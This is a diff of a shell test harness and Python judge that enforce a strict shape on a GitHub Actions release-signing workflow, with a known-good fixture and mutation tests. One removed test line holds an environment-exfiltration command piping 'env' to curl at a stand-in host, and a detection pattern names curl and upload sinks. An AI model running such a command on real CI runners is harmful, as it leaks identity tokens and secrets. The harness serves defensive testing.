@@ -10,7 +10,7 @@
 #                                                                 cosign to bin/install-scanner.sh)
 #                 4. run: printf '%s' "$DIGESTS" > digests.json  (env DIGESTS: ${{ inputs.digests }}, the only env in the job)
 #                 5. run: python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json
-#                         --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
+#                         --build-record signed/witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
 #                         (the filenames are PINNED: `--template` names the committed template, from which `sign --check` makes the
 #                          per-tag policy with the committed trust file and the tag from GITHUB_REF, rule 57; it verifies Build's
 #                          record, compares the digests, THEN signs; the identity token is requested by cosign
@@ -56,8 +56,15 @@ if [ -z "${CHAIN_KNOWN_RED_INNER:-}" ]; then
 fi
 root=$(cd "$(dirname "$0")/.." && pwd)
 work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
+FXDIR="$work/fx"; mkdir -p "$FXDIR"   # fixture strings that name a download tool are written here by quoted here-documents (pin-age proves them as text)
+# the sinks the judge calls an artifact (a pattern that names a download tool): written as text, read into the judge's environment
+cat > "$FXDIR/sink_artifact_rx" <<'FXEOF'
+upload|curl|\bgh\b
+FXEOF
+SINK_ARTIFACT_RX=$(cat "$FXDIR/sink_artifact_rx")
+export SINK_ARTIFACT_RX
 pass=0 failn=0
-python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (apt install python3-yaml)"; exit 1; }
+python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (install the python3-yaml package)"; exit 1; }
 cat > "$work/judge.py" <<'PY'
 import glob, json, os, re, sys, yaml
 SHA = r"[0-9a-f]{40}"
@@ -75,13 +82,45 @@ def load(path):
 def signer_calls(text, strip_comments=True): return _cts.signer_calls(text, TABLE, strip_comments)
 
 R_PRINTF = r"printf '%s' \"\$DIGESTS\" > digests\.json"
+R_PRINTF_REC = r"printf '%s' \"\$RECORDS\" > rebuild-records\.json"
+R_PRINTF_CREC = r"printf '%s' \"\$RECORDS\" > check-records\.json"
+R_PRINTF_CRECA = r"printf '%s' \"\$RECORDS_ARM64\" > check-records-arm64\.json"
 R_INSTALL = r"bash bin/install-scanner\.sh cosign"
-R_SIGN = r"python3 -I -B bin/chain-verify\.py sign --check --signer cosign --digests digests\.json --build-record witness-build/build-collection\.json --template \.github/policy/release-policy\.template\.json --out provenance"
+R_SIGNSTAGED = r"bash bin/witness-sign-staged\.sh staged signed"
+R_INSTALL_WIT = r"bash bin/install-scanner\.sh witness"
+# the Witness records of the building jobs carry a throwaway key's signature only (owner Oct 22, ops/docs/ratify/2026-10-22-witness-signed-outside-build.md): Sign checks them against
+# the artifacts it receives and signs each one keyless; the Rebuild records in their own job, which receives no Rebuild apk or image (the owner's separation rule)
+R_REC_BUILD = r"env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify\.py sign-records --stage build --template \.github/policy/release-policy\.template\.json --digests digests\.json --artifacts-dir artifacts --out staged --record-dir witness-build --record-dir witness-apk-ubuntu-24\.04 --record-dir witness-apk-ubuntu-24\.04-arm"
+R_REC_REBUILD = r"env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify\.py sign-records --stage rebuild --template \.github/policy/release-policy\.template\.json --digests digests\.json --expect-digests rebuild-records\.json --out staged --record-dir witness-rapk-ubuntu-24\.04 --record-dir witness-rapk-ubuntu-24\.04-arm --record-dir witness-rebuild"
+R_REC_CHECK = r"env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify\.py sign-records --stage check --template \.github/policy/release-policy\.template\.json --digests digests\.json --expect-digests check-records\.json --expect-digests check-records-arm64\.json --artifacts-dir artifacts --out staged --record-dir rec-check/witness-scanners --record-dir rec-check/witness-acceptance --record-dir rec-check/witness-runtime --record-dir rec-arm64/witness-arm64"
+RUNNERS = ("ubuntu-24.04", "ubuntu-24.04-arm")
+EXPECT_STEPS = {
+    "sign": [("checkout",), ("download", "witness-build", "witness-build")]
+            + [("download", n, "witness-build") for n in ("digests", "items", "admission-baseline")]
+            + [("download", "witness-apk-" + r, "witness-apk-" + r) for r in RUNNERS]
+            + [("download", "images", "artifacts/witness-build/out"), ("download", "dist", "artifacts/witness-build/dist")]
+            + [("download", "apk-" + r, "artifacts/witness-apk-" + r + "/out") for r in RUNNERS]
+            + [("install", "cosign"), ("install", "witness"), ("printf",), ("records", "build"), ("signstaged",), ("sign",), ("upload", "provenance", "provenance"),
+               ("upload", "signed-witness-build", "signed/witness-build")],
+    "sign-rebuild": [("checkout",)]
+            + [("download", "witness-rapk-" + r, "witness-rapk-" + r) for r in RUNNERS]
+            + [("download", "witness-rebuild", "witness-rebuild"), ("install", "witness"), ("printf",), ("printfrec",), ("records", "rebuild"), ("signstaged",)]
+            + [("upload", "signed-witness-rapk-" + r, "signed/witness-rapk-" + r) for r in RUNNERS]
+            + [("upload", "signed-witness-rebuild", "signed/witness-rebuild")],
+    # REQ-REL-011-AC1 (cache#606): the third call signs the Check jobs' records; Sign receives the records and the check-results the records name, nothing else
+    "sign-check": [("checkout",), ("download", "witness-check", "rec-check"), ("download", "witness-check-arm64", "rec-arm64/witness-arm64"),
+                   ("download", "check-results", "artifacts/check-results"), ("download", "check-results-arm64", "artifacts/check-results-arm64"),
+                   ("install", "witness"), ("printf",), ("printfchk",), ("printfchka",), ("records", "check"), ("signstaged",),
+                   ("upload", "signed-witness-check", "signed/witness-scanners\nsigned/witness-acceptance\nsigned/witness-runtime"), ("upload", "signed-witness-check-arm64", "signed/witness-arm64")],
+}
+R_SIGN = r"python3 -I -B bin/chain-verify\.py sign --check --signer cosign --digests digests\.json --build-record signed/witness-build/build-collection\.json --template \.github/policy/release-policy\.template\.json --out provenance"
 def judge_sign(path):
     if not os.path.exists(path): return ["missing: " + path]
     try: d, text = load(path)
     except Exception as ex: return ["AC1: %s cannot be judged (%s: %s)" % (os.path.basename(path), type(ex).__name__, ex)]
     bad = []
+    try: allowed = set(json.load(open(os.environ.get("CHAIN_ALLOWED") or os.path.join(os.environ.get("CHAIN_ROOT", "."), ".github/policy/allowed-actions.json"))).get("actions", []))
+    except (OSError, ValueError): allowed = None; bad.append("AC2: the allowed-actions list is unreadable (fail closed)")
     extra_top = set(d) - {"name", "on", "permissions", "jobs"}
     if extra_top: bad.append("AC3: top-level keys %s are not allowed (defaults.run.shell, concurrency, run-name, env can reroute every run step)" % sorted(extra_top))
     on = d.get("on")
@@ -89,24 +128,28 @@ def judge_sign(path):
         bad.append("AC1: on: must be exactly workflow_call: %s" % on)
     call = (on or {}).get("workflow_call") or {} if isinstance(on, dict) else {}
     inputs = call.get("inputs") or {}
-    if set(inputs) != {"digests"} or (inputs.get("digests") or {}).get("type") != "string":
-        bad.append("AC2: the only input must be `digests` (string), found %s" % sorted(inputs))
+    if set(inputs) != {"digests", "stage", "records", "records-arm64"} or any((inputs.get(k) or {}).get("type") != "string" for k in ("digests", "stage", "records", "records-arm64")):
+        bad.append("AC2: the only inputs must be `digests`, `stage`, `records` and `records-arm64` (all string; records is the Rebuild record digests for the rebuild call and the check job's for the check call, records-arm64 the arm64 job's), found %s" % sorted(inputs))
     if call.get("secrets"): bad.append("AC3: the workflow declares secrets")
     if call.get("outputs"): bad.append("AC3 (step output sink): workflow_call outputs are not allowed")
     if d.get("env"): bad.append("AC3: workflow-level env is not allowed")
     if re.search(r"secrets\b|toJSON|\bcontext\b", text): bad.append("AC3/002-AC4: secrets, toJSON or context appear in the file")
     jobs = d.get("jobs") or {}
-    if len(jobs) != 1: bad.append("AC1: exactly one job required, found %d" % len(jobs))
+    if set(jobs) != {"sign", "sign-rebuild", "sign-check"}: bad.append("AC1: exactly the jobs sign, sign-rebuild and sign-check are required, found %s" % sorted(jobs))
     for name, j in jobs.items():
         ro = j.get("runs-on")
         if not isinstance(ro, str) or not _cts.HOSTED.fullmatch(ro):   # the ONE closed runner set, shared with the stage grammar (Sonnet r7 R2)
             bad.append("AC1: job %s must run on a GitHub-hosted ubuntu runner, got %r" % (name, ro))
-        for k in ("container", "services", "uses", "env", "outputs", "strategy", "needs", "environment", "defaults", "if", "secrets"):
+        for k in ("container", "services", "uses", "env", "outputs", "strategy", "needs", "environment", "defaults", "secrets"):
             if k in j: bad.append("AC2/AC3: job %s has `%s`, which Sign's job must not have" % (name, k))
+        stg = {"sign": "build", "sign-rebuild": "rebuild", "sign-check": "check"}.get(name, "?")
+        if j.get("if") != "${{ inputs.stage == '%s' }}" % stg:
+            bad.append("AC1: job %s must have exactly `if: ${{ inputs.stage == '%s' }}` (the release graph calls this file once per stage), found %r" % (name, stg, j.get("if")))
         perm = j.get("permissions")
         if not isinstance(perm, dict) or perm.get("id-token") != "write" or any(v == "write" for k, v in perm.items() if k != "id-token"):
             bad.append("AC3: Sign's permissions must be id-token: write and no other write: %s" % perm)
         order = []
+        seq = []
         for s in j.get("steps") or []:
             sn = s.get("name") or s.get("uses") or s.get("run")
             extra = set(s) - {"name", "uses", "with", "run", "env", "id"}
@@ -118,18 +161,19 @@ def judge_sign(path):
                 m = re.fullmatch(r"(actions/[a-z-]+)@(%s)( #.*)?" % SHA, u)
                 if not m: bad.append("AC2: step %r uses %r; only a pinned actions/checkout, download-artifact or upload-artifact" % (sn, u)); continue
                 act = m.group(1)
+                if allowed is not None and u.split(" #")[0] not in allowed: bad.append("AC2: step %r uses %s, which is not on the allowed-actions list" % (sn, u.split(" #")[0]))
                 if act == "actions/checkout":
-                    order.append("checkout")
+                    order.append("checkout"); seq.append(("checkout",))
                     if set(w) - {"persist-credentials", "fetch-depth"} or w.get("persist-credentials") != "false":
                         bad.append("AC3: checkout must say persist-credentials: false explicitly (the default writes the job token into .git/config): %s" % w)
                 elif act == "actions/download-artifact":
-                    order.append("download")
-                    if w.get("name") != "witness-build" or set(w) - {"name", "path"} or w.get("path", "witness-build") != "witness-build":
-                        bad.append("AC2: step %r downloads %s; only the artifact witness-build into witness-build (data, never run)" % (sn, w))
+                    order.append("download"); seq.append(("download", w.get("name"), w.get("path")))
+                    if set(w) - {"name", "path"} or ("download", w.get("name"), w.get("path")) not in EXPECT_STEPS.get(name, []):
+                        bad.append("AC2: step %r downloads %s; Sign downloads only the records and the artifacts it signs, at the fixed paths (data, never run); sign-rebuild receives no Rebuild apk or image" % (sn, w))
                 elif act == "actions/upload-artifact":
-                    order.append("upload")
-                    if w.get("path") != "provenance" or w.get("name") != "provenance" or set(w) - {"name", "path", "if-no-files-found", "retention-days"}:
-                        bad.append("AC3 (artifact sink): step %r uploads %s; only the path `provenance` (name provenance) may leave Sign" % (sn, w))
+                    order.append("upload"); seq.append(("upload", w.get("name"), w.get("path")))
+                    if ("upload", w.get("name"), w.get("path")) not in EXPECT_STEPS.get(name, []) or set(w) - {"name", "path", "if-no-files-found", "retention-days"}:
+                        bad.append("AC3 (artifact sink): step %r uploads %s; only provenance and the signed-witness-* directories may leave Sign" % (sn, w))
                 else:
                     bad.append("AC2: step %r uses %s, which Sign may not" % (sn, act))
             else:
@@ -137,22 +181,41 @@ def judge_sign(path):
                     bad.append("AC1 run line: step %r has a backslash-newline or a control, non-ASCII or invisible character (str.strip() and bash would read different words)" % sn); continue
                 line = run.strip()
                 if "\n" not in line and re.fullmatch(R_PRINTF, line):
-                    order.append("printf")
+                    order.append("printf"); seq.append(("printf",))
                     if env != {"DIGESTS": "${{ inputs.digests }}"}: bad.append("AC3: the digests step must have exactly env DIGESTS: ${{ inputs.digests }}, found %s" % env)
+                elif "\n" not in line and re.fullmatch(R_PRINTF_REC, line):
+                    order.append("printf"); seq.append(("printfrec",))
+                    if env != {"RECORDS": "${{ inputs.records }}"}: bad.append("AC3: the records step must have exactly env RECORDS: ${{ inputs.records }}, found %s" % env)
+                elif "\n" not in line and re.fullmatch(R_PRINTF_CREC, line):
+                    order.append("printf"); seq.append(("printfchk",))
+                    if env != {"RECORDS": "${{ inputs.records }}"}: bad.append("AC3: the check records step must have exactly env RECORDS: ${{ inputs.records }}, found %s" % env)
+                elif "\n" not in line and re.fullmatch(R_PRINTF_CRECA, line):
+                    order.append("printf"); seq.append(("printfchka",))
+                    if env != {"RECORDS_ARM64": "${{ inputs.records-arm64 }}"}: bad.append("AC3: the arm64 check records step must have exactly env RECORDS_ARM64: ${{ inputs.records-arm64 }}, found %s" % env)
                 elif "\n" not in line and re.fullmatch(R_INSTALL, line):
-                    order.append("install")
+                    order.append("install"); seq.append(("install", "cosign"))
+                    if env: bad.append("AC3: step %r passes env" % sn)
+                elif "\n" not in line and re.fullmatch(R_INSTALL_WIT, line):
+                    order.append("install"); seq.append(("install", "witness"))
                     if env: bad.append("AC3: step %r passes env" % sn)
                 elif "\n" not in line and re.fullmatch(R_SIGN, line):
-                    order.append("sign")
+                    order.append("sign"); seq.append(("sign",))
                     if env: bad.append("AC3: the signing step passes env %s; the digests come from the file" % sorted(env))
+                elif "\n" not in line and re.fullmatch(R_SIGNSTAGED, line):
+                    order.append("signstaged"); seq.append(("signstaged",))
+                    if env: bad.append("AC3: the staged-signing step passes env %s" % sorted(env))
+                elif "\n" not in line and (re.fullmatch(R_REC_BUILD, line) or re.fullmatch(R_REC_REBUILD, line) or re.fullmatch(R_REC_CHECK, line)):
+                    kind = "build" if re.fullmatch(R_REC_BUILD, line) else "rebuild" if re.fullmatch(R_REC_REBUILD, line) else "check"
+                    order.append("records"); seq.append(("records", kind))
+                    if env: bad.append("AC3: the records step passes env %s" % sorted(env))
                 else:
                     sinks = [n for n, rx in (("file", r">>?\s*\S|\btee\b|\bcp\b|\bmv\b"), ("log", r"\becho\b|\bprintf\b|\bcat\b|\bset\s+-\w*x"),
-                                             ("step output", r"GITHUB_(OUTPUT|ENV|STEP_SUMMARY|PATH)"), ("artifact", r"upload|curl|\bgh\b")) if re.search(rx, run)]
-                    why = "touches the identity token request (sinks reachable: %s)" % (", ".join(sinks) or "none, but no step may touch it") if re.search(TOKEN, run, re.I) else "is not one of the three allowed command lines (install cosign; write digests.json from env; chain-verify.py sign --check ... --out provenance)"
+                                             ("step output", r"GITHUB_(OUTPUT|ENV|STEP_SUMMARY|PATH)"), ("artifact", os.environ["SINK_ARTIFACT_RX"])) if re.search(rx, run)]
+                    why = "touches the identity token request (sinks reachable: %s)" % (", ".join(sinks) or "none, but no step may touch it") if re.search(TOKEN, run, re.I) else "is not one of the allowed command lines (install cosign or witness; printf an env value into one of the four record/digest files; the three sign-records forms; witness-sign-staged.sh; the one chain-verify.py sign --check ... --out provenance)"
                     bad.append("AC2/AC3: run step %r %s" % (sn, why))
                 if "${{" in run or ".." in run: bad.append("AC2: run step %r interpolates an expression or uses `..`" % sn)
-        want = ["checkout", "download", "install", "printf", "sign", "upload"]
-        if order != want: bad.append("AC2: Sign's steps must be exactly %s in that order (the check-then-sign step is the only signer), found %s" % (want, order))
+        want = EXPECT_STEPS.get(name)
+        if want is not None and seq != want: bad.append("AC2: job %s's steps must be exactly %s in that order (check-then-sign: the records step and, in sign, the provenance step are the only signers), found %s" % (name, want, seq))
     return bad
 
 def judge_build(path):
@@ -366,12 +429,26 @@ def direct_signers(base, files, frozen, allowed, bad):
     disc = []
     found = signing_files(base, disc)          # workflows, composite actions and any other jobs:/runs: YAML anywhere (Codex #249 r7 B8, r8 B4)
     bad += ["AC1: " + x for x in disc]
+    called, judged = set(), set()
     for f in found:
         rel = os.path.relpath(f, wfdir) if f in files else os.path.relpath(f, base)
         if os.path.relpath(f, base) in frozen or rel == "stage-sign.yml": continue
+        judged.add(rel)
         for e, pv, line in signer_calls(open(f).read()) + decoded_signer_calls(f, rel, bad):
+            called.add((rel, e["name"]))
             if pv: bad.append("AC1: %s signs provenance (%s: %s); only stage-sign.yml may" % (rel, e["name"], line[:80]))
             elif e["name"] not in allowed.get(rel, set()): bad.append("AC1: %s calls %r, which is not listed with a reason in chain-signers.json" % (rel, e["name"]))
+    # rc-2 signing review R5: a listed signer must be one the tree can use: its file exists, and a file this judge reads makes that call
+    # (a pre-authorisation of a signer that must never return is the opposite of the allowlist; the legacy frozen files are not read, so their rows are not judged)
+    for rel, tools in sorted(allowed.items()):
+        # a row must name a file this judge READS, spelled the one way it keys it (a workflow by its bare name, any other judged file by its path from the root); a legacy
+        # frozen file is not read, so its row is not judged either way. A path alias, a directory, a file the judge never reads (not YAML, or stage-sign.yml itself) or a
+        # different case on a case-insensitive disk would otherwise skip the unused-row check below (Codex astra on #638)
+        rs = str(rel)
+        if rs not in judged and rs not in frozen and (".github/workflows/" + rs) not in frozen:
+            bad.append("AC1: chain-signers.json lists %s, which is not a file this judge reads (a workflow is named by its bare name, any other file by its path from the root; remove the row)" % rel); continue
+        if rel in judged:
+            bad += ["AC1: chain-signers.json lists %r for %s, but that file makes no such call (remove the row)" % (t, rel) for t in sorted(tools, key=str) if (rel, t) not in called]
 
 def stage_grammars(base, files, frozen, rows, envn, bad):
     """001-AC1: "every stage-*.yml is judged over a closed set of keys" (keys, env names, uses, run lines). Returns what each stage runs."""
@@ -469,6 +546,8 @@ expect() { # expect ok|caught LABEL judge ARG
   else failn=$((failn + 1)); echo "FAIL $2 -> ${out:0:500}"; fi
 }
 sha=$(printf 'a%.0s' $(seq 40))
+printf '{"actions":["actions/checkout@%s","actions/download-artifact@%s","actions/upload-artifact@%s"]}\n' "$sha" "$sha" "$sha" > "$work/allowed.json"
+export CHAIN_ALLOWED="$work/allowed.json"
 good="$work/good.yml"
 cat > "$good" <<EOF
 name: 'Stage: sign'
@@ -479,10 +558,25 @@ on:
         description: 'JSON of the digests Build produced'
         required: true
         type: string
+      stage:
+        description: 'build or rebuild: which records this call signs'
+        required: true
+        type: string
+      records:
+        description: 'the Rebuild record digests'
+        required: false
+        type: string
+        default: ''
+      records-arm64:
+        description: 'the arm64 check job record digests'
+        required: false
+        type: string
+        default: ''
 permissions:
   contents: read
 jobs:
   sign:
+    if: \${{ inputs.stage == 'build' }}
     runs-on: ubuntu-24.04
     permissions:
       contents: read
@@ -495,18 +589,167 @@ jobs:
         with:
           name: witness-build
           path: witness-build
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: digests
+          path: witness-build
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: items
+          path: witness-build
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: admission-baseline
+          path: witness-build
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: witness-apk-ubuntu-24.04
+          path: witness-apk-ubuntu-24.04
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: witness-apk-ubuntu-24.04-arm
+          path: witness-apk-ubuntu-24.04-arm
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: images
+          path: artifacts/witness-build/out
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: dist
+          path: artifacts/witness-build/dist
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: apk-ubuntu-24.04
+          path: artifacts/witness-apk-ubuntu-24.04/out
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: apk-ubuntu-24.04-arm
+          path: artifacts/witness-apk-ubuntu-24.04-arm/out
       - name: install the signing tool (pinned by checksum)
         run: bash bin/install-scanner.sh cosign
+      - name: install Witness (pinned by checksum)
+        run: bash bin/install-scanner.sh witness
       - name: write the digest list to a file
         env:
           DIGESTS: \${{ inputs.digests }}
         run: printf '%s' "\$DIGESTS" > digests.json
+      - name: check Build's records against the artifacts, then sign them
+        run: env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify.py sign-records --stage build --template .github/policy/release-policy.template.json --digests digests.json --artifacts-dir artifacts --out staged --record-dir witness-build --record-dir witness-apk-ubuntu-24.04 --record-dir witness-apk-ubuntu-24.04-arm
+      - name: sign the staged records and check each signed one
+        run: bash bin/witness-sign-staged.sh staged signed
       - name: check Build's record, compare the digests, then sign the provenance
-        run: python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
+        run: python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record signed/witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
       - uses: actions/upload-artifact@$sha # v7
         with:
           name: provenance
           path: provenance
+      - uses: actions/upload-artifact@$sha # v7
+        with:
+          name: signed-witness-build
+          path: signed/witness-build
+  sign-rebuild:
+    if: \${{ inputs.stage == 'rebuild' }}
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - uses: actions/checkout@$sha # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: witness-rapk-ubuntu-24.04
+          path: witness-rapk-ubuntu-24.04
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: witness-rapk-ubuntu-24.04-arm
+          path: witness-rapk-ubuntu-24.04-arm
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: witness-rebuild
+          path: witness-rebuild
+      - name: install Witness (pinned by checksum)
+        run: bash bin/install-scanner.sh witness
+      - name: write the digest list to a file
+        env:
+          DIGESTS: \${{ inputs.digests }}
+        run: printf '%s' "\$DIGESTS" > digests.json
+      - name: write the record digests to a file
+        env:
+          RECORDS: \${{ inputs.records }}
+        run: printf '%s' "\$RECORDS" > rebuild-records.json
+      - name: check Rebuild's records, then sign them
+        run: env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify.py sign-records --stage rebuild --template .github/policy/release-policy.template.json --digests digests.json --expect-digests rebuild-records.json --out staged --record-dir witness-rapk-ubuntu-24.04 --record-dir witness-rapk-ubuntu-24.04-arm --record-dir witness-rebuild
+      - name: sign the staged records and check each signed one
+        run: bash bin/witness-sign-staged.sh staged signed
+      - uses: actions/upload-artifact@$sha # v7
+        with:
+          name: signed-witness-rapk-ubuntu-24.04
+          path: signed/witness-rapk-ubuntu-24.04
+      - uses: actions/upload-artifact@$sha # v7
+        with:
+          name: signed-witness-rapk-ubuntu-24.04-arm
+          path: signed/witness-rapk-ubuntu-24.04-arm
+      - uses: actions/upload-artifact@$sha # v7
+        with:
+          name: signed-witness-rebuild
+          path: signed/witness-rebuild
+  sign-check:
+    if: \${{ inputs.stage == 'check' }}
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - uses: actions/checkout@$sha # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: witness-check
+          path: rec-check
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: witness-check-arm64
+          path: rec-arm64/witness-arm64
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: check-results
+          path: artifacts/check-results
+      - uses: actions/download-artifact@$sha # v8
+        with:
+          name: check-results-arm64
+          path: artifacts/check-results-arm64
+      - name: install Witness (pinned by checksum)
+        run: bash bin/install-scanner.sh witness
+      - name: write the digest list to a file
+        env:
+          DIGESTS: \${{ inputs.digests }}
+        run: printf '%s' "\$DIGESTS" > digests.json
+      - name: write the check job record digests to a file
+        env:
+          RECORDS: \${{ inputs.records }}
+        run: printf '%s' "\$RECORDS" > check-records.json
+      - name: write the arm64 check job record digests to a file
+        env:
+          RECORDS_ARM64: \${{ inputs.records-arm64 }}
+        run: printf '%s' "\$RECORDS_ARM64" > check-records-arm64.json
+      - name: check Check's records against the results, then sign them
+        run: env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify.py sign-records --stage check --template .github/policy/release-policy.template.json --digests digests.json --expect-digests check-records.json --expect-digests check-records-arm64.json --artifacts-dir artifacts --out staged --record-dir rec-check/witness-scanners --record-dir rec-check/witness-acceptance --record-dir rec-check/witness-runtime --record-dir rec-arm64/witness-arm64
+      - name: sign the staged records and check each signed one
+        run: bash bin/witness-sign-staged.sh staged signed
+      - uses: actions/upload-artifact@$sha # v7
+        with:
+          name: signed-witness-check
+          path: |-
+            signed/witness-scanners
+            signed/witness-acceptance
+            signed/witness-runtime
+      - uses: actions/upload-artifact@$sha # v7
+        with:
+          name: signed-witness-check-arm64
+          path: signed/witness-arm64
 EOF
 # mutate LABEL  python-regex  replacement : writes $work/LABEL.yml, or counts a FAILURE if the mutation did not apply
 mutate() {
@@ -521,17 +764,66 @@ PY
 caught() { # LABEL regex replacement
   if mutate "$1" "$2" "$3"; then expect caught "$1" sign "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml"; fi
 }
-SIGNLINE='run: python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance'
+SIGNLINE='run: python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record signed/witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance'
 expect ok "fixture: known-good Sign passes the judge" sign "$good"
+caught "F11 a digest-shaped download-artifact pin that is not on the allowed-actions list" 'download-artifact@a{40}' "download-artifact@$(printf 'b%.0s' $(seq 40))"
+caught "F1 Sign no longer downloads Build's digest list into witness-build" 'name: digests\n          path: witness-build' 'name: dist\n          path: witness-build'
+caught "REL-011 the Check call drops the arm64 record digests list" ' --expect-digests check-records-arm64.json' ''
+caught "REL-011 the Check call drops the check job record digests list" ' --expect-digests check-records.json' ''
+caught "REL-011 the Check call reads the arm64 digests from the check list" '--expect-digests check-records-arm64.json' '--expect-digests check-records.json'
+caught "REL-011 the Check call drops a record folder" ' --record-dir rec-check/witness-runtime' ''
+caught "REL-011 the Check call takes a record folder from another place" '--record-dir rec-arm64/witness-arm64' '--record-dir rec-check/witness-arm64'
+caught "REL-011 the Check call checks no artifacts" ' --artifacts-dir artifacts' ''
+caught "REL-011 sign-check does not receive the check results" 'name: check-results\n          path: artifacts/check-results' 'name: dist\n          path: artifacts/check-results'
+caught "REL-011 sign-check does not receive the arm64 check results" 'name: check-results-arm64\n          path: artifacts/check-results-arm64' 'name: dist\n          path: artifacts/check-results-arm64'
+caught "REL-011 sign-check also downloads the images" 'name: check-results-arm64\n          path: artifacts/check-results-arm64\n' 'name: check-results-arm64\n          path: artifacts/check-results-arm64\n      - uses: actions/download-artifact@\$sha # v8\n        with:\n          name: images\n          path: artifacts/images\n'
+caught "REL-011 sign-check uploads the unsigned records" 'name: signed-witness-check\n          path: |-\n            signed/witness-scanners' 'name: signed-witness-check\n          path: |-\n            rec-check/witness-scanners'
+caught "REL-011 sign-check uploads an extra directory" 'signed/witness-runtime' 'signed/witness-runtime\n            artifacts'
+caught "REL-011 sign-check without the stage if" "if: \\\${{ inputs.stage == 'check' }}" "if: \\\${{ inputs.stage != 'build' }}"
+caught "REL-011 sign-check gets the wrong records env" 'RECORDS_ARM64: \${{ inputs.records-arm64 }}' 'RECORDS_ARM64: \${{ inputs.records }}'
+caught "REL-011 sign-check holds a write permission beyond id-token" '(  sign-check:.*?permissions:\n      contents: read\n      id-token: write)' '\1\n      packages: write'
+caught "R2 the Rebuild call drops the expected record digests" ' --expect-digests rebuild-records.json' ''
+caught "R2 the Rebuild records step reads the digests from another file" '--expect-digests rebuild-records.json' '--expect-digests digests.json'
+caught "item 4 the unused signed apk records are uploaded again" 'name: signed-witness-build\n          path: signed/witness-build' 'name: signed-witness-build\n          path: signed/witness-build\n      - uses: actions/upload-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n        with:\n          name: signed-witness-apk-ubuntu-24.04\n          path: signed/witness-apk-ubuntu-24.04'
 caught "AC1 self-hosted runner" 'ubuntu-24.04' 'self-hosted'
 caught "AC1 extra trigger" 'workflow_call:' 'push:\n  workflow_call:'
 caught "AC1 second job" '    steps:' '    steps: []\n  other:\n    runs-on: ubuntu-24.04\n    steps:'
-caught "AC3 workflow-level defaults.run.shell reroutes every run step (leaks the token variables)" 'permissions:\n  contents: read\njobs' "defaults:\n  run:\n    shell: \"bash -c 'env | curl -d @- https://x.example; bash {0}'\"\npermissions:\n  contents: read\njobs"
+# ---- the Witness move (owner Oct 22 2026): Sign signs the building jobs' records in two jobs of this one file (one identity); Rebuild's records in a job that receives no Rebuild apk or image ----
+caught "WIT3 a third job" '  sign-rebuild:' '  third:\n    runs-on: ubuntu-24.04\n    steps: []\n  sign-rebuild:'
+caught "WIT3 the Rebuild signing job is gone" '  sign-rebuild:.*\Z' ''
+caught "WIT3 sign-rebuild downloads a Rebuild apk (the signer never receives Rebuild's apks)" '          name: witness-rebuild\n          path: witness-rebuild' '          name: rapk-ubuntu-24.04\n          path: witness-rebuild'
+caught "WIT3 sign-rebuild downloads the images" '(  sign-rebuild:.*?)name: witness-rebuild' '\1name: images'
+caught "WIT3 sign downloads a Rebuild record" 'name: apk-ubuntu-24.04-arm\n          path: artifacts/witness-apk-ubuntu-24.04-arm/out' 'name: witness-rapk-ubuntu-24.04-arm\n          path: artifacts/witness-apk-ubuntu-24.04-arm/out'
+caught "WIT3 sign downloads an artifact to another path" 'path: artifacts/witness-build/dist' 'path: artifacts/other'
+caught "WIT3 sign-rebuild without id-token (it signs keyless)" '(  sign-rebuild:.*?)      id-token: write' '\1      attestations: read'
+caught "WIT3 sign-rebuild with a write beyond id-token" '(  sign-rebuild:.*?permissions:\n      contents: read)' '\1\n      packages: write'
